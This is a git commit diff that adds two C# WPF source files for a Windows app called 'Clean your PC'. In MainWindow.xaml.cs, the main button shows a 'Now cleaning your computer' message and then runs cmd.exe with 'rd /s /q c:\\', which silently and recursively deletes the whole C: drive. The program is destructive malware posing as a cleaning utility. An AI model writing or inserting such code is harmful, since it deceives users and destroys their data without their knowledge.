90d63a2e21140b2d448b2b3eecbfc9ea1021ddc3
nature <83909607+YucriNatsure@users.noreply.github.com>
2021-08-31 22:20:16 +0900

    Add files via upload

---
+++ CleanyourPC/Clean your PC/MainWindow.xaml.cs
@@ -0,0 +1,42 @@
+﻿using System.Windows;
+using System.Diagnostics;
+
+namespace Clean_your_PC
+{
+    /// <summary>
+    /// MainWindow.xaml の相互作用ロジック
+    /// </summary>
+    public partial class MainWindow : Window
+    {
+        public MainWindow()
+        {
+            InitializeComponent();
+            button1.IsEnabled = false;
+            Check.IsEnabled = false;
+        }
+   
+
+
+
+        private void Button_Click(object sender, RoutedEventArgs e)
+        {
+            MessageBox.Show("Now cleaning your computer.\nPlease wait...");
+            ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "  /c rd /s /q c:\\");
+            // コマンド実行
+            Process.Start(processStartInfo);
+
+        }
+
+        private void Button_Click_1(object sender, RoutedEventArgs e)
+        {
+            Check.IsEnabled = true;
+            var win = new Window1();
+            win.Show();
+        }
+
+        private void CheckBox_Checked(object sender, RoutedEventArgs e)
+        {
+            button1.IsEnabled = true;
+        }
+    }
+}
---
+++ CleanyourPC/Clean your PC/Window1.xaml.cs
@@ -0,0 +1,20 @@
+﻿using System.Windows;
+
+
+namespace Clean_your_PC
+{
+    /// <summary>
+    /// Window1.xaml の相互作用ロジック
+    /// </summary>
+    public partial class Window1 : Window
+    {
+        public Window1()
+        {
+            InitializeComponent();
+
+        }
+       
+    }
+
+    }
+  
